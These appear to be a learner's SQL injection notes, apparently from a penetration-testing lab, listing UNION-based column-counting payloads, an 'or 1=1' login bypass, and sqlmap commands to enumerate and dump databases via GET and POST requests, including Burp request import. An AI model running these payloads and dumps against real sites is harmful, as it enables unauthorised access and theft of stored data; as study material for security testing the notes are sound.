SQLi Notes

Boolean (union based injection)
?search=query’ UNION SELECT ‘els1’; — - (error might mean columns wrong)
?search=query’ UNION SELECT ‘els1’, ‘els2’; — - (another error means increment)
?search=query’ UNION SELECT ‘els1’, ‘els2’, ‘els3’, ‘els4’; — - (no errors triggered means query contains 4 field, and is therefore vulnerable to UNION based injections

—banner command confirms db version

-v3 shows what payload sqlmap uses, you can test in browser, but replace # with %23

—dbs once you have a command which works, this can be appended to show databases
—users will show users which can access
-D <db name> —tables = this shows tables in the database
-D <db name> -T <table name> —columns
-D <db name> -T <table name> —C <column name, column name2> —dump


__________________________________________________
Above this line applies to GET, below is more specific to POST
__________________________________________________
In repeater:
user=admin&pass=password  (default)
user=admin’&pass=password or user=admin’ or 1=1; — -@pass=password     These are to determine whether the parameter is vulnerable

sqlmap -u ‘<website.php>’ —data=‘user=a&pass=a’ -p user —technique=B —banner 
(This is for a POST request to website with those user and pass, using Boolean techniques on the user parameter to retrieve the database banner) Maybe click N to skip the redirect

Add —dbs, then tables etc. 

Can directly import a request from Burp Proxy while is saved to a file
sqlmap -r <file.req location> -p user —technique=B —banner
File may help reveal the request which can then be sent back to Repeater
